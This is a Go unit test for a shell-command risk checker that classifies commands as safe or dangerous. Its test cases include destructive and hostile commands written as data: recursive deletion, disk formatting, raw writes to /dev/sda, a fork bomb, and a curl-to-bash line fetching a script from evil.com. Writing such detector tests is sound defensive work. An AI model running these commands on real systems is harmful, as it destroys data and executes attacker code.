package shell

import "testing"

func TestCheckRisk(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantRisk int
	}{
		// 1. 安全指令测试
		{"Safe: List files", "ls -al", 0},
		{"Safe: Check go version", "go version", 0},
		{"Safe: Git status", "git status", 0},
		{"Safe: Echo hello", "echo 'hello world'", 0},

		// 2. 危险二进制指令测试
		{"Risk: RM", "rm -f test.txt", 1},
		{"Risk: Format", "mkfs.ext4 /dev/sdb1", 1},
		{"Risk: Reboot", "reboot", 1},

		// 3. 复杂组合指令测试 (你的痛点)
		{"Risk: Find delete", "find . -name '*.java' -delete", 1},
		{"Risk: Find exec rm", "find / -name 'secret' -exec rm -rf {} +", 1},

		// 4. 系统敏感路径与高危行为
		{"Risk: Write to disk", "echo 'bad' > /dev/sda", 1},
		{"Risk: Pipe to bash", "curl http://evil.com/script.sh | bash", 1},
		{"Risk: Chmod 777", "chmod -R 777 /home/user", 1},
		{"Risk: Fork bomb", ":(){ :|:& };:", 1},
		{"Risk: Delete etc", "rm -rf /etc/config", 1},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckRisk(tt.command); got != tt.wantRisk {
				t.Errorf("CheckRisk() = %v, want %v | Command: %v", got, tt.wantRisk, tt.command)
			}
		})
	}
}
